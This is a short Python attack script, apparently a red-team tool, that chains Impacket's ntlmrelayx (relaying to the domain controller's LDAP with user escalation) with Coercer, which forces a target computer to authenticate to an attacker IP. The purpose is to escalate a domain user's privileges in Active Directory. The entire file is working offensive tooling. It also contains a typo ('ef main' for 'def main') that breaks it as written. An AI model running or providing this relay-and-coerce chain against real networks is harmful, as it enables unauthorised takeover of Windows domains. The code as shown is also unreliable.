import argparse
import subprocess
import time

print("CoerceThatPC")
print("By: Hann1bl3L3ct3r")
print("Script to automate the exploitation of a computer object being a member of an Administrators group within Active Directory.\n")

ef main(target_ip, attacker_ip, dc_ip, username, password):
    try:
        # Step 1: Start the ntlmrelayx with the goal of escalating privileges
        ntlmrelay_command = [
            'ntlmrelayx.py',
            '-t', f'ldap://{dc_ip}',
            '--escalate-user', f'{username}',
            '-smb2support',
            '-debug'
        ]
        print("[+] Starting NTLM Relay Attack \n")
        relay_process = subprocess.Popen(ntlmrelay_command)

        # Add a delay to ensure ntlmrelayx is ready
        print("[+] Waiting for 10 seconds to ensure ntlmrelayx is fully set up \n")
        time.sleep(10)

        # Step 2: Use Coercer to force authentication to the attacker's IP
        coercer_command = [
            'coercer',
            'coerce',
            '-u', username,
            '-p', password,
            '-t', target_ip,
            '-l', attacker_ip,
            '--always-continue'
        ]
        print("[+] Starting coersion attack on machine \n")
        subprocess.run(coercer_command, check=True)

        # Wait for the relay process to complete
        relay_process.wait()

    except subprocess.CalledProcessError as e:
        print(f"[-] An error occurred: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='NTLM Relay attack using Coercer and Impacket.')
    parser.add_argument('--target-ip', required=True, help='IP address of the target device to coerce authentication from.')
    parser.add_argument('--attacker-ip', required=True, help='IP address of the attacker machine (where NTLM relay will occur).')
    parser.add_argument('--dc-ip', required=True, help='IP address of the Domain Controller to relay the authentication to.')
    parser.add_argument('--username', required=True, help='Username for Coercer to use.')
    parser.add_argument('--password', required=True, help='Password for Coercer to use.')

    args = parser.parse_args()
    main(args.target_ip, args.attacker_ip, args.dc_ip, args.username, args.password)
